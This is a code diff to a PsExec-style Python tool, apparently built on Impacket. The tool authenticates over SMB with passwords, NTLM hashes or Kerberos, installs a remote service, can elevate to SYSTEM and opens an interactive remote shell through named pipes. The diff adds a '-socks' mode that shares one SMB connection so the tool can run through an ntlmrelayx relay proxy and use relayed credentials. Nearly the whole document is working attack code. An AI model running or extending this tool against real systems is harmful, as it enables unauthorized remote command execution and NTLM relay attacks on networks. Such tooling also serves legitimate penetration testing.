@@ -47,6 +47,10 @@ class RemComResponse(Structure):
     )
 
 lock = Lock()
+socks_lock = Lock()  
+socks_mode = False
+shared_smb_connection = None
+shared_ipc_tid = None
 
 class PSEXECSVC:
     def __init__(self, username, password, domain, options):
@@ -66,12 +70,13 @@ class PSEXECSVC:
         self.do_kerberos = options.do_kerberos
         self.service_name = options.service_name
         self.remote_binary_name = options.remote_binary_name
+        self.socks = options.socks
 
         if options.hashes:
             self.lmhash, self.nthash = options.hashes.split(":")
         
     def run(self):
-        stringbinding = f"ncacn_np:{remoteName}[\pipe\svcctl]" 
+        stringbinding = f"ncacn_np:{remoteName}[\\pipe\\svcctl]" 
         logging.debug(f"StringBinding: {stringbinding}")
         rpctransport = transport.DCERPCTransportFactory(stringbinding)
         rpctransport.set_dport(self.port)
@@ -91,10 +96,9 @@ class PSEXECSVC:
             try:
                 s.waitNamedPipe(tid,pipe)
                 pipeReady = True
-            except:
+            except Exception:
                 tries -= 1
                 time.sleep(2)
-                pass
 
         if tries == 0:
             raise Exception("Pipe not ready, aborting")
@@ -113,11 +117,17 @@ class PSEXECSVC:
             logging.critical(str(e))
             exit(1)
 
-        global dialect
+        global dialect, socks_mode, shared_smb_connection, shared_ipc_tid
         dialect = rpctransport.get_smb_connection().getDialect()
 
         s = rpctransport.get_smb_connection()
         s.setTimeout(100000)
+
+        if self.socks:
+            socks_mode = True
+            shared_smb_connection = s
+            logging.info("[SOCKS] SOCKS mode active - reusing SMB connection for all pipes")
+            s.isGuestSession = lambda: False
 
         try:
 
@@ -129,6 +139,8 @@ class PSEXECSVC:
             installService.install()
 
             tid = s.connectTree('IPC$')
+            if self.socks:
+                shared_ipc_tid = tid
             logging.debug(f"Connecting to \\{self.remote_binary_name.split('.')[0]} initial named pipe")
             fid_main = self.openPipe(s, tid, f"\\{self.remote_binary_name.split('.')[0]}", 0x12019f)
 
@@ -142,8 +154,9 @@ class PSEXECSVC:
             init['PID'] = os.getpid()
             random_string = "".join(random.choice(string.ascii_letters + string.digits) for _ in range(8))
             init['Computer'] = random_string.encode("utf-16le").ljust(520, b"\0")
-            init['Command'] = f"{self.command}".encode('utf-16le').ljust(520, b"\0")
-            init['Arguments'] = f"{self.arguments}".encode('utf-16le').ljust(520, b"\0")
+            
+            init['Command'] = self.command.encode('utf-16le').ljust(520, b"\0")
+            init['Arguments'] = self.arguments.encode('utf-16le').ljust(520, b"\0")
             init['OthersOptions'] = "".encode('utf-16le').ljust(16385, b"\0")
             init['Interactif'] = bytes.fromhex("00")   
             init['RestrictedToken'] = bytes.fromhex("00")
@@ -154,11 +167,11 @@ class PSEXECSVC:
             init['Padding'] = bytes.fromhex("000000000000010000000000000000000000")
 
             if self.system:
-                print(f"[+] Elevating to system")
+                print("[+] Elevating to system")
                 init['ElevateToSystem'] = bytes.fromhex("01")
 
             if self.user:
-                print(f"[+] Remote LogonUser to enable SSO")
+                print("[+] Remote LogonUser to enable SSO")
                 init['Username'] = f'{self.domain}\\{self.username}'.encode('utf-16le').ljust(520, b'\0')
                 init['Password'] = f'{self.password}'.encode('utf-16le').ljust(520, b'\0')
                 init['LogonUser'] = bytes.fromhex("01")
@@ -170,22 +183,34 @@ class PSEXECSVC:
             global LastDataSent
             LastDataSent = ""
 
-            inpipe = f"\\{self.remote_binary_name.split('.')[0]}-{random_string}-{init['PID']}-stdin"
-            logging.debug(f"Opening STDIN pip {inpipe}")
-            stdin_pipe = RemoteStdInPipe(rpctransport, inpipe, smb.FILE_WRITE_DATA | smb.FILE_APPEND_DATA, installService.getShare())
-            stdin_pipe.start()
-                
             outpipe = f"\\{self.remote_binary_name.split('.')[0]}-{random_string}-{init['PID']}-stdout"
             logging.debug(f"Opening STDOUT pip {outpipe}")
             stdout_pipe = RemoteStdOutPipe(rpctransport, outpipe, smb.FILE_READ_DATA)
-            stdout_pipe.start()
         
             errpipe = f"\\{self.remote_binary_name.split('.')[0]}-{random_string}-{init['PID']}-stderr"
             logging.debug(f"Opening STDERR pip {errpipe}")
             stderr_pipe = RemoteStdErrPipe(rpctransport, errpipe, smb.FILE_READ_DATA)
-            stderr_pipe.start()
 
-            ans = s.readNamedPipe(tid, fid_main, 64)
+            inpipe = f"\\{self.remote_binary_name.split('.')[0]}-{random_string}-{init['PID']}-stdin"
+            logging.debug(f"Opening STDIN pip {inpipe}")
+
+            if self.socks:
+                logging.debug("[SOCKS] Sequential pipe connection...")
+                stdout_pipe.connectPipe()
+                stderr_pipe.connectPipe()
+                stdin_pipe = RemoteStdInPipe(rpctransport, inpipe, smb.FILE_WRITE_DATA | smb.FILE_APPEND_DATA, installService.getShare(), stdout_pipe, stderr_pipe)
+                stdin_pipe.connectPipe()
+                stdin_pipe.start()
+                stdin_pipe.join()
+                
+                with socks_lock:
+                    ans = s.readNamedPipe(tid, fid_main, 64)
+            else:
+                stdin_pipe = RemoteStdInPipe(rpctransport, inpipe, smb.FILE_WRITE_DATA | smb.FILE_APPEND_DATA, installService.getShare())
+                stdin_pipe.start()
+                stdout_pipe.start()
+                stderr_pipe.start()
+                ans = s.readNamedPipe(tid, fid_main, 64)
 
             if len(ans):
                 retCode = RemComResponse(ans)
@@ -196,7 +221,7 @@ class PSEXECSVC:
         except Exception as e:
             logging.debug(f"\nGot exception: {e}")
         except KeyboardInterrupt:
-            logging.debug(f"\nCaught a keyboard interupt exception")
+            logging.debug("\nCaught a keyboard interrupt exception")
         finally:
             installService.uninstall()
             sys.stdout.flush()
@@ -216,23 +241,38 @@ class Pipes(Thread):
         self.pipe = pipe
         self.permissions = permissions
         self.daemon = True
+        self.already_connected = False
 
     def connectPipe(self):
+        if self.already_connected:
+            return
         try:
             lock.acquire()
-            global dialect
-            self.server = SMBConnection(self.transport.get_smb_connection().getRemoteName(), self.transport.get_smb_connection().getRemoteHost(), sess_port=self.port, preferredDialect=SMB2_DIALECT_21)
-            user, passwd, domain, lm, nt, aesKey, TGT, TGS = self.credentials
-            if self.transport.get_kerberos() is True:
-                self.server.kerberosLogin(user, passwd, domain, lm, nt, aesKey, kdcHost=self.transport.get_kdcHost(), TGT=TGT, TGS=TGS)
+            global dialect, socks_mode, shared_smb_connection, shared_ipc_tid
+            
+            if socks_mode and shared_smb_connection is not None:
+                self.server = shared_smb_connection
+                self.tid = shared_ipc_tid
+                logging.debug(f"[SOCKS] Reusing shared connection for {self.pipe}")
             else:
-                self.server.login(user, passwd, domain, lm, nt)
+                self.server = SMBConnection(self.transport.get_smb_connection().getRemoteName(), self.transport.get_smb_connection().getRemoteHost(), sess_port=self.port, preferredDialect=SMB2_DIALECT_21)
+                user, passwd, domain, lm, nt, aesKey, TGT, TGS = self.credentials
+                if self.transport.get_kerberos() is True:
+                    self.server.kerberosLogin(user, passwd, domain, lm, nt, aesKey, kdcHost=self.transport.get_kdcHost(), TGT=TGT, TGS=TGS)
+                else:
+                    self.server.login(user, passwd, domain, lm, nt)
+                self.tid = self.server.connectTree("IPC$")
             lock.release()
-            self.tid = self.server.connectTree("IPC$")
 
-            self.server.waitNamedPipe(self.tid, self.pipe)
-            self.fid = self.server.openFile(self.tid, self.pipe, self.permissions, creationOption = 0x40, fileAttributes = 0x80)
-            self.server.setTimeout(1000000)
+            if socks_mode:
+                with socks_lock:
+                    self.server.waitNamedPipe(self.tid, self.pipe)
+                    self.fid = self.server.openFile(self.tid, self.pipe, self.permissions, creationOption = 0x40, fileAttributes = 0x80)
+            else:
+                self.server.waitNamedPipe(self.tid, self.pipe)
+                self.fid = self.server.openFile(self.tid, self.pipe, self.permissions, creationOption = 0x40, fileAttributes = 0x80)
+                self.server.setTimeout(1000000)
+            self.already_connected = True
         except Exception as e:
             if logging.getLogger().level == logging.DEBUG:
                 import traceback
@@ -249,7 +289,7 @@ class RemoteStdOutPipe(Pipes):
         while True:
             try:
                 ans = self.server.readFile(self.tid, self.fid, 0, 1024)
-            except:
+            except Exception:
                 pass
             else:
                 try:
@@ -261,7 +301,7 @@ class RemoteStdOutPipe(Pipes):
                         LastDataSent = ""
                     if LastDataSent > 10:
                         LastDataSent = ""
-                except:
+                except Exception:
                     pass
 
 class RemoteStdErrPipe(Pipes):
@@ -273,17 +313,17 @@ class RemoteStdErrPipe(Pipes):
         while True:
             try:
                 ans = self.server.readFile(self.tid, self.fid, 0, 1024)
-            except:
+            except Exception:
                 pass
             else:
                 try:
                     sys.stderr.write(ans.decode("cp437"))
                     sys.stderr.flush()
-                except:
+                except Exception:
                     pass
 
 class RemoteShell(cmd.Cmd):
-    def __init__(self, server, port, credentials, tid, fid, share, transport):
+    def __init__(self, server, port, credentials, tid, fid, share, transport, stdout_pipe=None, stderr_pipe=None):
         cmd.Cmd.__init__(self, False)
         self.prompt = "\x08"
         self.server = server
@@ -294,15 +334,54 @@ class RemoteShell(cmd.Cmd):
         self.share = share
         self.port = port
         self.transport = transport
+        self.stdout_pipe = stdout_pipe
+        self.stderr_pipe = stderr_pipe
         self.intro = "[!] Press help for extra shell commands"
 
     def connect_transferClient(self):
-        self.transferClient = SMBConnection("*SMBSERVER", self.server.getRemoteHost(), sess_port=self.port, preferredDialect=SMB2_DIALECT_21)
-        user, passwd, domain, lm, nt, aesKey, TGT, TGS = self.credentials
-        if self.transport.get_kerberos() is True:
-            self.transferClient.kerberosLogin(user, passwd, domain, lm, nt, aesKey, kdcHost=self.transport.get_kdcHost(), TGT=TGT, TGS=TGS)
+        global socks_mode, shared_smb_connection
+        
+        if socks_mode and shared_smb_connection is not None:
+            self.transferClient = shared_smb_connection
+            logging.debug("[SOCKS] Reusing shared connection for transferClient")
         else:
-            self.transferClient.login(user, passwd, domain, lm, nt)
+            self.transferClient = SMBConnection("*SMBSERVER", self.server.getRemoteHost(), sess_port=self.port, preferredDialect=SMB2_DIALECT_21)
+            user, passwd, domain, lm, nt, aesKey, TGT, TGS = self.credentials
+            if self.transport.get_kerberos() is True:
+                self.transferClient.kerberosLogin(user, passwd, domain, lm, nt, aesKey, kdcHost=self.transport.get_kdcHost(), TGT=TGT, TGS=TGS)
+            else:
+                self.transferClient.login(user, passwd, domain, lm, nt)
+
+    def _read_output_safe(self):
+        if self.stdout_pipe is None:
+            return
+        
+        output = b""
+        
+        try:
+            self.stdout_pipe.server.setTimeout(0.4)
+            
+            for _ in range(3):
+                try:
+                    ans = self.stdout_pipe.server.readFile(self.stdout_pipe.tid, self.stdout_pipe.fid, 0, 32768)
+                    if ans:
+                        output += ans
+                except Exception:
+                    break
+                time.sleep(0.07)
+            
+            if output:
+                text = output.decode("cp437", errors="ignore")
+                text = text.replace('\r\n', '\n').replace('\r', '')
+                sys.stdout.write(text)
+                sys.stdout.flush()
+            
+            self.stdout_pipe.server.setTimeout(100000)
+        except Exception:
+            try:
+                self.stdout_pipe.server.setTimeout(100000)
+            except Exception:
+                pass
 
     def emptyline(self):
         self.send_data(b"\r\n")
@@ -312,6 +391,7 @@ class RemoteShell(cmd.Cmd):
         self.send_data(line.encode("cp437") + b"\r\n")
 
     def send_data(self, data, hideOutput = True):
+        global socks_mode
         if hideOutput is True:
             global LastDataSent
             LastDataSent = data
@@ -319,15 +399,21 @@ class RemoteShell(cmd.Cmd):
             LastDataSent = ""
         for c in data:
             self.server.writeNamedPipe(self.tid, self.fid, bytes([c]))
+        
+        if socks_mode and self.stdout_pipe is not None:
+            time.sleep(0.35)
+            self._read_output_safe()
 
 class RemoteStdInPipe(Pipes):
-    def __init__(self, transport, pipe, permisssions, share=None):
+    def __init__(self, transport, pipe, permisssions, share=None, stdout_pipe=None, stderr_pipe=None):
         self.shell = None
+        self.stdout_pipe = stdout_pipe
+        self.stderr_pipe = stderr_pipe
         Pipes.__init__(self, transport, pipe, permisssions, share)
 
     def run(self):
         self.connectPipe()
-        self.shell = RemoteShell(self.server, self.port, self.credentials, self.tid, self.fid, self.share, self.transport)
+        self.shell = RemoteShell(self.server, self.port, self.credentials, self.tid, self.fid, self.share, self.transport, self.stdout_pipe, self.stderr_pipe)
         self.shell.cmdloop()
 
 if __name__ == "__main__":
@@ -354,6 +440,9 @@ if __name__ == "__main__":
     group.add_argument("-key-tab", action="store", help="Read keys for SPN from keytab file")
     group.add_argument("-dc-ip", dest="kdc_host", action="store", metavar="ip address", help="IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter")
     group.add_argument("-target-ip", action="store", metavar="ip address", help="IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve it")
+    
+    socks_group = parser.add_argument_group("SOCKS relay")
+    socks_group.add_argument("-socks", action="store_true", help="Use single SMB connection for all pipes (for use with ntlmrelayx SOCKS proxy)")
 
     if len(sys.argv) == 1:
         parser.print_help()
